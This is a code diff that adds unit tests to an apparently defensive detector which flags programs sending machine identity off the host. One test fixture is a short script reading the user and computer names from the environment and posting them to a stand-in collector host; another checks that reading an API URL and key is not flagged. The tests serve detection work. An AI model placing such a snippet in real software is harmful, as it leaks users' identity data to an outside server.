@@ -36,6 +36,24 @@ class Flow:
         return CapabilityDetector._identity_in_what_is_sent("shell", content, [])
 
 
+class TestTheVariablesNamingTheMachine:
+    def test_the_user_and_computer_names_read_from_the_environment_and_posted(self):
+        source = (
+            "import os, requests\n"
+            "def info():\n"
+            "    return {'u': os.getenv('USERNAME'), 'pc': os.environ['COMPUTERNAME']}\n"
+            "requests.post('https://collector.example.invalid', json=info())\n"
+        )
+        assert Flow.sent(source) == ["identity sent: requests.post"]
+
+    def test_a_setting_read_from_the_environment_is_not_identity(self):
+        source = (
+            "import os, requests\n"
+            "requests.get(os.environ['API_URL'], headers={'k': os.getenv('API_KEY')})\n"
+        )
+        assert Flow.sent(source) == []
+
+
 class TestAcrossFunctions:
     def test_identity_returned_by_one_function_and_posted_by_another(self):
         source = (
